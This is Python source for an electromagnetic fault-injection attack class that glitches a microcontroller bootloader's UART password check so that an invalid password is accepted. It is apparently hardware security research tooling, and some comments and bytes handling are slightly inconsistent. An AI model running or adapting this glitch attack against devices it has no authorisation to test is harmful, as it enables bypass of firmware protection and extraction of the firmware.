from dataclasses import dataclass, field
from enum import Enum
from functools import cached_property
from time import sleep

from tqdm import tqdm

from pulsecontrol.helpers import HasLogger, format_hex2
from pulsecontrol.strategies.dut.emfi_attack import EmfiAttack


class EMPEffect(Enum):
    ERROR = "error"
    SUCCESS = "success"
    NO_EFFECT = "no_effect"
    IO_ERROR = "io_error"
    SEND_RECEIVE_MISSMATCH = "send_receive_missmatch"
    REBOOT = "reboot"


@dataclass(kw_only=True)
class BamAttack(EmfiAttack[EMPEffect], HasLogger):
    # Flag to select the correct attack
    bam: bool
    fixed_end: int = -1
    move_after: int = 20

    # this value determines the number of repeats needed to get the desired pulse width
    public_password: list[int] = field(
        default_factory=lambda: [0xFE, 0xED, 0xFA, 0xCE, 0xCA, 0xFE, 0xBE, 0xEF]
    )

    def __post_init__(self):
        # Make sure the board is initialized
        self.whisperer.board_init = self.init_uart

    def move(self) -> bool:
        return not bool(self._counter % self.move_after)

    @cached_property
    def autobaud_enabled(self) -> bool:
        self.whisperer.restart_board()
        sleep(0.1)
        # Autobaud will return 0x59 (Y) if it is enabled, no matter the input
        val = self.check_echo(0x00)
        self.whisperer.restart_board()
        sleep(0.1)
        return val

    def init_uart(self):
        self.whisperer.target.ser.flush()
        if self.autobaud_enabled:
            self.whisperer.target.ser.write(b"\x00")
            sleep(0.05)
            self.log.info(
                'Flushed UART; Sent auto-baud zero-byte: %s',
                format_hex2(*self.whisperer.target.ser.hardware_read(1))
            )
        else:
            self.log.info('Flushed UART; Auto-baud not enabled')

    def check_echo(self, *data: int | bytes) -> bool:
        ser = self.whisperer.target.ser
        ser.flush()
        for d in data:
            ser.write(bytearray([d]))
        response = ser.hardware_read(len(data) + 5)
        self.log.info("Sent/Response: %s <-> %s", format_hex2(*data), format_hex2(*response))
        return tuple(response) == data

    def send_password(self, password: list[int]) -> EMPEffect:
        serial = self.whisperer.target.ser
        serial.flush()

        # write all bytes except the last one
        response = []
        for pw in password[:-1]:
            serial.write(bytearray([pw]))
            sleep(0.01)
            res = serial.hardware_read(5)
            response.extend(res)

        if response != password[:-1]:
            self.log.error("Send/Receive missmatch")
            return EMPEffect.SEND_RECEIVE_MISSMATCH

        ###############################################
        # Glitch (arm will enable the trigger on the serial connection)
        self.whisperer.scope.arm()
        serial.write(bytearray([password[-1]]))

        # check if the password was sent correctly
        response.extend(serial.hardware_read(5))
        self.log.info('Response: %s', format_hex2(*response))
        if response[:len(password)] == password:
            self.log.info("Data sent correctly")
        else:
            self.log.info(
                "Last byte not sent correctly. Expected: %s, got: %s", format_hex2(*password),
                format_hex2(*response)
            )

        serial.flush()
        # sleep(0.1)

        # Send start address, will indicate if the password was accepted
        try:
            # TODO: send complete and valid address. Bootloader might need complete command
            #  before it echos again
            result = self.check_echo(0x2F, 0x5A)
        except IOError as e:
            self.log.error("Error: %s", e)
            return EMPEffect.IO_ERROR

        if result:
            self.log.info("Password accepted")
            return EMPEffect.SUCCESS
        self.log.info("Password not accepted")
        return EMPEffect.NO_EFFECT

    def download_data(self, data: list):
        """
        https://www.youtube.com/watch?v=pkhV9K9raHE
        size = 0x2000
        """
        serial = self.whisperer.target.ser
        for i, w in tqdm(enumerate(data)):
            serial.write(bytearray([w]))
            response = serial.read(1)

            if len(response) != 1:
                self.log.info("Response: %x", response)
                raise IOError("wrong response length")
            elif ord(response[0]) != w:
                print("got wrong echo: %x != %x" % (ord(response[0]), w))
                raise IOError("wrong echo")
        serial.flush()

    def attack(self) -> EMPEffect:
        # invalid password
        password = [0xFF, 0xFE, 0xCA, 0xCE, 0xAB, 0xDA, 0xD4, 0xAF]
        self.init_uart()
        return self.send_password(password)
